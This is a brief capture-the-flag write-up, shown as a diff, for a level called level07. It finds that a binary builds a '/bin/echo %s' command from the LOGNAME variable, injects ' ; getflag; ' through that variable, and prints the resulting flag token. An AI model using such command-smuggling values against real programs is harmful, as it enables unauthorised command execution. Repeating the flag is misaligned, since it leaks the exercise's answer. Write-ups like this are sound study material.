@@ -1,0 +1,7 @@
+We see a binary file we use DogBolt we see this line:
+asprintf(&var_1c, "/bin/echo %s ", getenv("LOGNAME"));
+We see we can put injection code in %s using getenv("LOGNAME")
+We just need to change the LOGNAME env with export LOGNAME=" ; getflag;  "
+When we put ./level07 it will be  asprintf(&var_1c, "/bin/echo %s ", getenv("LOGNAME"));
+So %s =  ; getflag;
+We execute and we have Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
